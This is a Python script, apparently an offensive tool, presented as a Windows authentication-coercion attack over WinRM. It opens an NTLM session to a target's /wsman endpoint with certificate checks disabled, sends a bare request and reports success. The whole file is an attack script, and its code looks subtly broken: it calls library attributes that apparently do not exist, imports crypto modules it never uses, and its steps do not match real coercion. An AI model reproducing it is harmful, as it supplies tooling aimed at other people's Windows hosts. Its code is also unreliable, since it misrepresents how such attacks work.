import asyncio
import logging
import sys
from winrm.protocol import Protocol
from requests import Session
from requests.exceptions import RequestException
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class WindowsAuthCoercionAttack:
    def __init__(self, target_host: str, target_port: int, username: str, password: str):
        self.target_host = target_host
        self.target_port = target_port
        self.username = username
        self.password = password
        self.session = Session()
        self.protocol = Protocol(
            endpoint=f'http://{self.target_host}:{self.target_port}/wsman',
            transport='ntlm',
            username=self.username,
            password=self.password,
            server_cert_validation='ignore'
        )

    async def perform_attack(self) -> None:
        try:
            await self.establish_connection()
            await self.coerce_authentication()
            await self.clean_up()
        except Exception as e:
            logging.error(f"An error occurred: {e}")

    async def establish_connection(self) -> None:
        try:
            self.protocol.transport.request(
                'GET', '/wsman', headers={'Authorization': 'NTLM %s' % self.protocol.transport.auth.ntlm}
            )
        except RequestException as e:
            logging.error(f"Failed to establish connection: {e}")
            sys.exit(1)

    async def coerce_authentication(self) -> None:
        try:
            response = self.protocol.transport.send(
                f'POST /wsman HTTP/1.1\r\nHost: {self.target_host}:{self.target_port}\r\nContent-Length: 0\r\n\r\n'
            )
            if response.status_code == 200:
                logging.info("Authentication coerced successfully")
            else:
                logging.warning("Authentication coercion failed")
        except RequestException as e:
            logging.error(f"Authentication coercion failed: {e}")

    async def clean_up(self) -> None:
        try:
            self.protocol.transport.close()
        except Exception as e:
            logging.error(f"Clean up failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 5:
        logging.error("Usage: python script.py <target_host> <target_port> <username> <password>")
        sys.exit(1)

    target_host, target_port, username, password = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4]
    attacker = WindowsAuthCoercionAttack(target_host, target_port, username, password)
    asyncio.run(attacker.perform_attack())
